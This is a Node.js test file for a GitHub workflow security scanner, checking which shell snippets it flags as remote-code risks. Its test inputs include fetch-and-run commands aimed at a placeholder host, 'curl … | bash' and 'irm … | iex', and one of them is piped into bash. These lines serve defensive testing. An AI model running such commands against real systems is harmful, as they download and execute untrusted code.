'use strict';
const test=require('node:test');
const assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
function scan(script){
 const source=['on: issue_comment','permissions: read-all','jobs:','  scan:',
  '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(s=>'          '+s)].join('\n');
 return inspectWorkflow(source,{path:'.github/workflows/gauntlet-precision.yml'});
}
for(const cmd of [
 'echo "curl https://example.invalid/payload | bash"',
 'echo "irm https://example.invalid/payload | iex"',
 'echo "curl https://example.invalid/payload | bash" # placeholder note'
]){
 test('Pure documentation string is not an executable remote shell: '+cmd,()=>{
  const r=scan(cmd);
  assert.equal(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
  assert.equal(r.findings.length,0,JSON.stringify(r));
 });
}
test('Shell command invoked via dynamic variable cannot be certified clean',()=>{
 const r=scan('COMMAND=python\n$COMMAND local.py');
 assert.equal(r.status,'INCOMPLETE',JSON.stringify(r));
});
test('Literal echo piped to a shell is not treated as pure documentation',()=>{
 const r=scan('echo "curl https://example.invalid/payload | bash" | bash');
 assert.notEqual(r.status,'NO_RISK_PATTERN',JSON.stringify(r));
});
